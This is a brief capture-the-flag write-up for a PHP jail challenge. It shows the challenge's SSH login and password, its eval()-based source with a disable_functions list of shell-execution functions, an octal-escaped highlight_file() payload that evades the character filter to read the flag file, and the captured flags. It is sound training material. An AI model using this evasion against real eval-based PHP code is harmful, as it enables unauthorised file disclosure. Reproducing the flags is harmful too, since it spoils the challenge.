ssh level3@challenges.ringzer0ctf.com -p 10225

Mot de passe: FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL



WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"
```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
	if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
		return false;
	}
	return true;
}
if(filter($var)) {
	eval($var);
	echo "Command executed";
} else {
	echo "Restricted characters has been used";
}
echo "\n";
?>
```

highlight_file("\\146\\154\\141\\147\\056\\164\\170\\164");

FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H